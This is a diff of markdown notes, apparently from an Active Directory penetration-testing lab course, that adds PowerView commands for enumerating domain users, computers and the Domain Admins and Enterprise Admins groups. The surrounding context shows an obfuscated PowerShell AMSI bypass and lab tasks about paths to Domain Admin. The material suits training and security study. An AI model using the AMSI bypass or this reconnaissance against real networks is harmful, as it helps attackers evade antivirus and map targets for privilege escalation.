@@ -1,3 +1,6 @@
+### SUMMARY 
+
+
 ### AMSI bypass
 ```
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + 
@@ -46,3 +49,40 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 * Enterprise Administrators
 * Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
 * Find a file share where studentx has Write permissions.
+
+
+### List informations about all users 
+```
+Get-DomainUser
+```
+
+### List a specific property of all the users
+```
+Get-DomainUser | select -ExpandProperty samaccountname
+```
+
+### Enumerate member computers
+```
+Get-DomainComputer | select -ExpandProperty dnshostname
+```
+
+### See details of the Domain Admins group
+```
+Get-DomainGroup -Identity "Domain Admins"
+```
+
+### Enumerate members of the Domain Admins group
+```
+Get-DomainGroupMember -Identity "Domain Admins"
+```
+
+### Enumerate members of the Enterprise Admins group
+```
+Get-DomainGroupMember -Identity "Enterprise Admins"
+```
+
+### Query the root domain as Enterprise Admins group is present only in the root of a forest
+```
+Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
+```
+
